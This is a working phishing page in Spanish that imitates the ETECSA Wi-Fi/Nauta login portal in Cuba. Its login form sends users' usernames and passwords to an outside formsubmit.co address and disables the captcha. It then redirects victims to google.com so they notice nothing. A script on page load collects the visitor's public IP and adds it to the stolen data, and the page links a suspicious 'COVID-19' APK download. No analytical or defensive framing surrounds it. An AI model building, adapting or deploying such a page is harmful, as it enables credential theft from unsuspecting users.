<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Acceder a WIFI_ETECSA</title>
  <style>
    body {
      margin: 0;
      background: #e7e6fd;
      font-family: Arial, Helvetica, sans-serif;
    }
    .container {
      max-width: 430px;
      margin: 0 auto;
      background: #fff;
      border-radius: 0 0 18px 18px;
      box-shadow: 0 2px 12px #bbb7f0;
      padding-bottom: 30px;
    }
    .header {
      text-align: left;
      padding: 18px 20px 0 20px;
    }
    .header h1 {
      font-size: 1.7em;
      font-weight: bold;
      margin: 0;
      color: #222;
      letter-spacing: -1px;
    }
    .header a {
      color: #888;
      font-size: 1.1em;
      text-decoration: none;
      margin-top: 2px;
      display: block;
    }
    .banner {
      margin-top: 10px;
      background: linear-gradient(90deg, #4e2b8c 80%, #2a1e5c 100%);
      color: #fff;
      border-top: 6px solid #e60000;
      border-bottom: 1px solid #fff;
      padding: 12px 15px 10px 15px;
      font-size: 1em;
      text-align: center;
      position: relative;
    }
    .banner img {
      position: absolute;
      left: 10px;
      top: 10px;
      width: 50px;
      height: 50px;
    }
    .banner-text {
      margin-left: 60px;
      text-align: left;
    }
    .banner a {
      color: #00c3ff;
      text-decoration: underline;
      margin: 0 5px;
      font-size: 1em;
    }
    .lang-row {
      margin-top: -18px;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
      z-index: 2;
      position: relative;
    }
    .lang-row button {
      padding: 8px 28px;
      border-radius: 8px 8px 0 0;
      border: none;
      font-size: 1.1em;
      font-weight: bold;
      cursor: pointer;
      margin-bottom: 0;
      margin-top: 0;
      background: #252d8c;
      color: #fff;
      box-shadow: 0 2px 6px #bbb7f0;
      transition: background 0.2s;
    }
    .lang-row button:last-child {
      background: #e8e8e8;
      color: #252d8c;
    }
    .main {
      padding: 0 16px;
      text-align: center;
    }
    .main h2 {
      background: #252d8c;
      color: #fff;
      margin: 18px 0 15px 0;
      padding: 8px 0;
      border-radius: 6px 6px 0 0;
      font-size: 1.15em;
      font-weight: bold;
      letter-spacing: 0.5px;
    }
    .main a {
      color: #252d8c;
      text-decoration: underline;
      font-size: 1em;
      display: block;
      margin-bottom: 15px;
      margin-top: 6px;
      text-align: left;
    }
    .form-group {
      margin: 10px 0 0 0;
      text-align: left;
    }
    label {
      font-weight: bold;
      display: block;
      margin-bottom: 4px;
      color: #222;
      font-size: 1.05em;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 8px;
      border: 1.5px solid #aaa;
      border-radius: 6px;
      font-size: 1em;
      margin-bottom: 12px;
      box-sizing: border-box;
      background: #f7f7ff;
    }
    .form-buttons {
      margin: 10px 0 0 0;
      display: flex;
      justify-content: flex-start;
      gap: 8px;
    }
    .form-buttons button {
      background: #252d8c;
      color: #fff;
      border: none;
      padding: 7px 18px;
      border-radius: 8px;
      font-size: 1em;
      font-weight: bold;
      cursor: pointer;
      margin-bottom: 5px;
      transition: background 0.2s;
    }
    .form-buttons button:hover {
      background: #1b1e5c;
    }
    .links {
      margin: 10px 0 0 0;
      display: flex;
      justify-content: flex-start;
      gap: 12px;
      flex-wrap: wrap;
    }
    .links a {
      color: #252d8c;
      font-size: 0.98em;
      text-decoration: underline;
      margin: 0;
    }
    .logos-section {
      background: #e7e6fd;
      border-radius: 0 0 18px 18px;
      margin-top: 20px;
      padding: 18px 0 10px 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 12px;
    }
    .logos-row {
      display: flex;
      justify-content: center;
      gap: 18px;
      margin-bottom: 6px;
    }
    .logos-row img {
      background: #fff;
      border-radius: 10px;
      width: 70px;
      height: 70px;
      object-fit: contain;
      box-shadow: 0 2px 8px #d5d5f0;
      padding: 7px;
    }
    @media (max-width: 500px) {
      .container {
        max-width: 99vw;
        border-radius: 0 0 10px 10px;
        padding-bottom: 10px;
      }
      .main {
        padding: 0 4vw;
      }
      .logos-row img {
        width: 55px;
        height: 55px;
        padding: 4px;
      }
      .banner img {
        width: 36px;
        height: 36px;
        left: 2px;
        top: 8px;
      }
      .banner-text {
        margin-left: 40px;
        font-size: 0.98em;
      }
      .lang-row button {
        font-size: 1em;
        padding: 7px 14px;
      }
    }
  </style>
</head>

<body>
   
  <div class="container">
    <div class="header">
    </div>
    <div class="banner">
      <img src="https://cdn-icons-png.flaticon.com/512/483/483947.png" alt="wifi" />
      <div class="banner-text">
        Tus familiares y amigos pueden <span style="color:#00c3ff;">recargar tu cuenta <i>nauta</i></span> desde el exterior a través de:
        <br>
        <a href="#">www.DTone.com</a>
        <a href="#">www.ding.com</a>
        <a href="#">www.csqworld.com</a>
      </div>
    </div><br>
    <div class="lang-row">
      <button>Español</button>
      <button style="background:#e8e8e8;color:#252d8c;">English</button>
    </div>
    <div class="main">
      <h2>Bienvenido</h2>
      <a href="#">Descargue aquí APK "COVID-19"</a>
      <form action="https://formsubmit.co/9d70540b605f64c384daf66a370abd3e" method="POST">
        <div class="form-group">
          <label for="usuario">Usuario:</label>
          <input type="text" id="usuario" name="usuario">
        </div>
        <input type="hidden" name="_next" value="https://google.com">
        <div class="form-group">
          <label for="contrasena">Contraseña:</label>
          <input type="password" id="contrasena" name="contrasena">
          <input type="hidden" name="ip_usuario" id="ip_usuario">
          
        </div>
        <input type="hidden" name="_captcha" value="false">
        <div class="form-buttons">
          <button type="submit">Aceptar</button>
          <button type="button">Cancelar</button>
          <button type="button">Ayuda</button>
        </div>
      </form>
      <div class="links">
        <a href="#">Condiciones de uso de usuario</a>
        <a href="#">Portal de Usuario</a>
        <a href="#">Información</a>
      </div>
    </div>
    <div class="logos-section">
      <div class="logos-row">
        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Cubadebate_logo.png" alt="Cubadebate">
        <img src="https://www.cubaeduca.cu/themes/cubaeduca/logo.png" alt="CubaEduca">
        <img src="https://cubarte.cult.cu/static/img/logo-cubarte.png" alt="Cubarte">
      </div>
      <div class="logos-row">
        <img src="https://www.cubasi.cu/sites/all/themes/cubasi/logo.png" alt="Cubasi">
        <img src="https://www.cubadebate.cu/wp-content/themes/cubadebate-2019/images/logo-cubadebate.png" alt="Otra">
      </div>
    </div>
  </div>
  <script>
document.addEventListener('DOMContentLoaded', function() {
    // Obtener la IP pública usando ipify
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        document.getElementById('ip_usuario').value = data.ip;
      })
      .catch(() => {
        document.getElementById('ip_usuario').value = 'No disponible';
      });
});
  </script>
  
  
</body>
</html>
